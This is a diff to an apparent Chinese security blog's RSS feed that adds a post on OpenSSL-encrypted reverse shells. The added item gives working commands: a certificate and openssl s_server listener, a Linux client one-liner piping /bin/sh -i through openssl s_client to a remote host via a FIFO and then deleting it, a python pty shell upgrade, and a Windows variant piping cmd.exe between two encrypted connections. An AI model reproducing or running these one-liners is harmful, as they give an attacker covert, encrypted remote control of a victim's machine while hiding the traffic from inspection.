@@ -4048,6 +4048,116 @@ Java本身提供了Instrumentation类来实现&lt;br /&gt;
 <description>Beijing: ☀️ 🌡️+31°C 🌬️↑11km/h [[https://imcaviare.com/post/auto-deploy-hugo/][hug</description>
 </item>
 <item>
+<title>加密反弹Openssl_ReverseShell</title>
+<link>http://crkmythical.github.io/blog/%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%BC%B9openssl_reverseshell/</link>
+<pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+<guid>http://crkmythical.github.io/blog/%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%BC%B9openssl_reverseshell/</guid>
+<description>&lt;p&gt;Beijing: ☀️   🌡️+31°C 🌬️↑15km/h&lt;/p&gt;
+&lt;h1 id="加密反弹openssl_reverseshell"&gt;加密反弹Openssl_ReverseShell&lt;/h1&gt;
+&lt;h2 id="linux环境"&gt;Linux环境&lt;/h2&gt;
+&lt;h3 id="server"&gt;server&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days &lt;span class="m"&gt;365&lt;/span&gt; -nodes
+
+openssl s_server -quiet  -key key.pem -cert cert.pem -port &lt;span class="m"&gt;7777&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;req&lt;/code&gt;   创建和处理证书&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-x509&lt;/code&gt;  专用于生成CA证书&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-newkey rsa:2048&lt;/code&gt;  创建一个使用RSA算法生成2048位的证书和私钥&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-keyout key.pem&lt;/code&gt;   私钥保存位置&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-out cert.pem&lt;/code&gt;     证书保存位置&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-days 365&lt;/code&gt;  指定证书的有效期限,单位为day，默认365天&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-nodes&lt;/code&gt; : 不加密私钥&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="使用python-pty模块将不完全shell变为完全shell"&gt;使用python pty模块将不完全shell变为完全shell&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;python3 -c &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id="键入-ctrl-z回到-vps-的命令行中再输入如下命令"&gt;键入 Ctrl-Z，回到 VPS 的命令行中，再输入如下命令：&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;stty raw -echo
+&lt;span class="nb"&gt;fg&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id="回到不完全shell-中在不完全-shell-中键入-ctrl-l执行"&gt;回到不完全shell 中；在不完全 shell 中键入 Ctrl-l，执行：&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;reset 
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;SHELL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;bash 
+&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;TERM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;xterm-256color 
+stty rows &lt;span class="m"&gt;54&lt;/span&gt; columns &lt;span class="m"&gt;104&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;此时已经变成了功能齐全的交互式 shell，比如支持命令补全、语法高亮等。&lt;/p&gt;
+&lt;h3 id="client"&gt;client&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;mkfifo /tmp/s&lt;span class="p"&gt;;&lt;/span&gt; /bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; openssl s_client -quiet -connect 192.168.xx.xx:7777 &amp;gt; /tmp/s&lt;span class="p"&gt;;&lt;/span&gt; rm /tmp/s
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;mkfifo /tmp/s&lt;/code&gt;   创建管道&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&amp;amp;1&lt;/code&gt; 打开交互式shell，2&amp;gt;&amp;amp;1的意思是把标准错误输出重定向到标准输出，否则输入错误命令回显会显示在靶机中&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;openssl s_client -quiet -connect 192.168.xx.xx:7777 &amp;gt; /tmp/s&lt;/code&gt; 解密流量，将攻击端输入的数据解密后反弹回攻击端&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-quiet&lt;/code&gt; 不打印出session和证书的信息。同时隐式打开&lt;code&gt;-ign_eof&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-ign_eof&lt;/code&gt; 当输入文件到达文件尾的时候并不断开连接&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-connect host:port&lt;/code&gt; 设置服务器地址和端口号。如果没有设置，则默认为本地主机以及端口号4433&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;rm /tmp/s&lt;/code&gt;  由于已经加载进内存，清除掉/tmp/s文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="windows环境"&gt;Windows环境&lt;/h2&gt;
+&lt;h3 id="server-1"&gt;Server&lt;/h3&gt;
+&lt;p&gt;服务端开启两个监听，从 ip:port1 获取命令发送给 cmd.exe执行，然后结果返回到 ip:port2。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;span class="m"&gt;443&lt;/span&gt;
+openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;span class="m"&gt;445&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="client-1"&gt;client&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;openssl s_client -quiet -connect 1.1.1.1:443 &lt;span class="p"&gt;|&lt;/span&gt; cmd.exe &lt;span class="p"&gt;|&lt;/span&gt; openssl s_client -quiet -connect 1.1.1.1:445
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id="操作演示"&gt;操作演示&lt;/h1&gt;</description>
+</item>
+<item>
 <title>安装Tomcat-macOS版</title>
 <link>http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%89%E8%A3%85tomcat-macos%E7%89%88/</link>
 <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
